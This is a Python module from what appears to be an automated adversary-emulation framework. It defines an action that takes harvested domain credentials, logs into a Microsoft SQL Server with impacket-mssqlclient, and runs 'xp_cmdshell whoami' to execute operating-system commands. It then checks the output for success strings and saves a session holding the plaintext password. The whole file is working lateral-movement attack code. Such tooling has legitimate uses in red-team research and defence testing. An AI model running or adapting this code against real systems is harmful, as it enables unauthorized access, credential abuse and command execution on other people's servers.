import re
from typing import Any

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern
from kg_api.query import Query
from motifs import ActionInputMotif, ActionOutputMotif
from Session import SessionManager


class ImpacketMSSQLClient(Action):
    """
    ImpacketMSSQLClient action that connects to SQL Server instances using Windows authentication.
    This action requires:
    - A User entity with domain_context, name, and credentials attributes
    - A ComputerAccount entity with ip_address (provides the SQL Server IP)
    - The computer account should be identified as a SQL Server instance
    """

    def __init__(self):
        super().__init__("ImpacketMSSQLClient", "T1021", "TA0008", [])
        self.noise = 0.2
        self.impact = 0.6
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for ImpacketMSSQLClient.

        Query for Users entities and their associated ComputerAccounts using creds.

        Returns:
            ActionInputMotif: Input motif requiring related DomainPartition, ComputerAccount (controller=False) and Credentials entities
        """
        input_motif = ActionInputMotif(
            name="InputMotif_ImpacketMSSQLClient",
            description="Input requirements for Impacket MSSQLClient command",
        )
        input_motif.add_template(entity=Entity('DomainPartition', alias='domain'), template_name="existing_domain")
        input_motif.add_template(
            entity=Entity('ComputerAccount', alias='computer', controller=False),
            template_name="existing_account",
            match_on="existing_domain",
            relationship_type="belongs_to",
        )
        input_motif.add_template(
            entity=Entity('Credentials', alias='creds'),
            template_name="existing_creds",
            match_on="existing_domain",
            relationship_type="secured_with",
            invert_relationship=True,
        )
        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif for ImpacketMSSQLClient.
        """
        output_motif = ActionOutputMotif(
            name="OutputMotif_ImpacketMSSQLClient", description="Output motif for ImpacketMSSQLClient"
        )

        output_motif.add_template(
            template_name="discovered_session",
            entity=Entity("Session", alias="session", protocol="mssql", active=True),
            relationship_type="executes_on",
            match_on=Entity("ComputerAccount"),
            expected_attributes=["id", "username", "password"],
        )

        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return the expected outcome of the ImpacketMSSQLClient action.
        """
        username = pattern.get('creds').get('username')
        sql_ip = pattern.get('computer').get('ip_address')
        domain = pattern.get('domain').get('label')
        return [f"Connect to SQL Server on {sql_ip} using Windows authentication with {username}@{domain} credentials"]

    def get_target_query(self) -> Query:
        """
        Query for Users entities and their associated ComputerAccounts.
        """
        query = self.input_motif.get_query()
        query.ret_all()
        return query

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Execute impacket-mssqlclient command to connect to SQL Server using Windows authentication.
        """
        username = pattern.get('creds').get('username')
        password = pattern.get('creds').get('password')
        domain = pattern.get('domain').get('label')

        computer_account = pattern.get('computer')
        sql_ip = computer_account.get('ip_address')
        hostname = computer_account.get('name') or 'unknown'
        fullhostname = hostname.lower() + '.' + domain

        # Create output file artefact for SQL commands and results
        output_filename = f"mssql_session_{hostname}.txt"
        output_uuid = artefacts.placeholder(output_filename)
        output_path = artefacts.get_path(output_uuid)

        # Construct the mssqlclient command
        # Format: impacket-mssqlclient -windows-auth domain/username:password@hostname -show -target-ip IP -command "xp_cmdshell 'whoami'"
        command_args = [
            "-windows-auth",
            f"{domain}/{username}:{password}@{fullhostname}",
            "-show",
            "-target-ip",
            sql_ip,
            "-command",
            "xp_cmdshell whoami",  # This can be replaced to use a file with the commands and use it with `--command -file commands_file.sql`
        ]

        try:
            exec_result = shell("impacket-mssqlclient", command_args)

            # Write the output to the artefact file
            with open(output_path, 'w') as f:
                f.write(f"SQL Server Connection to {hostname} ({sql_ip})\n")
                f.write(f"User: {username}@{domain}\n")
                f.write(f"Command: impacket-mssqlclient {' '.join(command_args)}\n")
                f.write("=" * 50 + "\n")
                f.write(f"STDOUT:\n{exec_result.stdout or ''}\n")
                f.write(f"STDERR:\n{exec_result.stderr or ''}\n")
                f.write(f"Exit Status: {exec_result.exit_status}\n")

            exec_result.artefacts["mssql_session"] = output_uuid

            # Check for successful connection indicators
            output_text = (exec_result.stdout or "") + (exec_result.stderr or "")
            success_indicators = [
                "Encryption required, switching to TLS",
                "ENVCHANGE(DATABASE)",
                "INFO(",
                "ACK: Result:",
                "SQL (",
                "Press help for extra shell commands",
                "output",
            ]

            if any(indicator in output_text for indicator in success_indicators):
                exec_result.exit_status = 0

                # Extract the actual user from whoami output for session creation
                # TODO: if we use a file with the commands, we need to fix this to something more robust
                whoami_user = username  # Default to the username we used
                whoami_match = re.search(r'whoami\s*:\s*([^\s\n]+)', output_text, re.IGNORECASE)
                if whoami_match:
                    whoami_user = whoami_match.group(1)

                # Create a session for successful MSSQL connection
                sess_id = sessions.add_session(
                    {
                        "protocol": "mssql",
                        "host": sql_ip,
                        "hostname": hostname,
                        "username": whoami_user,
                        "domain": domain,
                        "password": password,
                    }
                )
                exec_result.session = sess_id

            return exec_result

        except Exception as e:
            error_msg = f"MSSQL client execution failed: {str(e)}"
            return ActionExecutionResult(
                command=["impacket-mssqlclient"] + command_args,
                stderr=error_msg,
                exit_status=1,
                logs=[f"ImpacketMSSQLClient failed: {error_msg}"],
            )

    def capture_state_change(
        self, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Capture state changes from the ImpacketMSSQLClient execution.
        Creates File entities for SQL session logs and updates computer account with SQL Server information.
        """
        changes: StateChangeSequence = []

        # If the command failed, don't process any state changes
        if output.exit_status != 0:
            return changes

        username = pattern.get('creds').get('username')
        computer_account = pattern.get('computer')

        # Add session entity if we have a successful session
        if hasattr(output, 'session') and output.session:
            new_session = self.output_motif.instantiate(
                "discovered_session",
                match_on_override=computer_account,
                protocol='mssql',
                id=output.session,
                username=username,
                domain=pattern.get('domain').get('label'),
                host=computer_account.get('ip_address'),
                hostname=computer_account.get('name'),
            )
            changes.append(new_session)

        return changes

    def parse_output(self, output: ActionExecutionResult) -> dict[str, Any]:
        """
        Placeholder implementation for actions not using the new architecture.
        """
        return {}

    def populate_output_motif(self, pattern: Pattern, discovered_data: dict[str, list[str]]) -> StateChangeSequence:
        """
        Placeholder implementation for actions not using the new architecture.
        """
        return []
